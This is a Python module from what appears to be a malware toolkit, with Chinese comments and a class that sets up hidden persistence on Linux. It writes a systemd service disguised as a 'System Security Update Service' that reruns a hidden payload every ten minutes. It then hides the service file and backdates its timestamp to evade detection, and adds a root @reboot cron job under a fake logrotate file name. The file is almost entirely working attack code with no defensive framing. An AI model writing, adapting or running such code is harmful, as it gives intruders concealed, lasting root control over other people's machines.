import os
import time
from utils.stealth_tools import StealthUtils


class PersistenceManager:
    @staticmethod
    def install_hidden_service():
        """安装隐蔽后台服务"""
        service_content = f"""
[Unit]
Description=System Security Update Service
[Service]
ExecStart=/bin/sh -c "while true; do {settings.PAYLOAD_DIR}/.update-arm; sleep 600; done"
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
"""
        service_path = "/etc/systemd/system/.system-update.service"

        # 写入隐藏服务文件
        with open(service_path, 'w') as f:
            f.write(service_content)

        # 修改文件属性
        StealthUtils.hide_file(service_path)
        os.system("systemctl daemon-reload")
        os.system("systemctl enable --now .system-update.service")

        # 修改时间戳
        fake_timestamp = time.mktime((2023, 1, 1, 0, 0, 0, 0, 0, 0))
        os.utime(service_path, (fake_timestamp, fake_timestamp))

    @staticmethod
    def hijack_cron():
        """劫持计划任务"""
        cron_job = f"@reboot root {settings.PAYLOAD_DIR}/.update-arm\n"
        with open("/etc/cron.d/.logrotate", "a") as f:
            f.write(cron_job)
        os.system("crontab /etc/cron.d/.logrotate")